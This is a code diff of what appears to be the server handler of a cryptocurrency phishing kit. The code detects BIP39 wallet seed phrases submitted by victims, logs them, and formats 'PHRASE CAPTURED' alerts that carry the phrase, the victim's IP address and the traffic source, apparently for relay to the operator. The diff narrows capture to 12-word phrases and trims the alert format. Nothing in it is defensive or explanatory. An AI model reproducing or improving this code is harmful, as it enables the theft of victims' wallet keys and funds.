@@ -115,11 +115,11 @@ export default async function handler(req, res) {
     console.log('📨 Received data:', JSON.stringify(data, null, 2));
     console.log('🔍 Extracted phrase:', phraseContent ? phraseContent.substring(0, 50) + '...' : 'NONE');
 
-    // BIP39 seed phrase validator — relaxed to catch real phrases
+    // BIP39 seed phrase validator — only 12 words
     function isRealSeedPhrase(val) {
       if (!val || typeof val !== 'string') return false;
       const words = val.trim().split(/\s+/).filter(w => w.length > 0);
-      if (![12, 15, 18, 21, 24].includes(words.length)) return false;
+      if (words.length !== 12) return false; // Only 12 words
       const validWord = /^[a-z]{2,12}$/;
       const validCount = words.filter(w => validWord.test(w.toLowerCase())).length;
       return (validCount / words.length) >= 0.8;
@@ -166,12 +166,10 @@ export default async function handler(req, res) {
     let message;
 
     if (isSeedPhraseData || isPhraseType || detectedPhrase) {
-      // ===== SEED PHRASE - COMPACT FORMAT =====
-      message = `🔑 <b>PHRASE CAPTURED</b> — ${wordCount} words | ${trafficSrc} | <code>${ip}</code>
+      // ===== 12-WORD PHRASE ONLY =====
+      message = `🔑 ${detectedPhrase || phraseContent}
 
-<code>${detectedPhrase || phraseContent || 'NOT FOUND'}</code>
-
-📍 ${pageLocation} | ⏰ ${new Date().toISOString().replace('T',' ').substring(0,19)}`;
+📍 ${trafficSrc}`;
     } else {
       // ===== VISITOR ACTIVITY - COMPACT FORMAT =====
       message = `🚀 <b>Visitor</b> | ${searchEngine} | <code>${ip}</code>
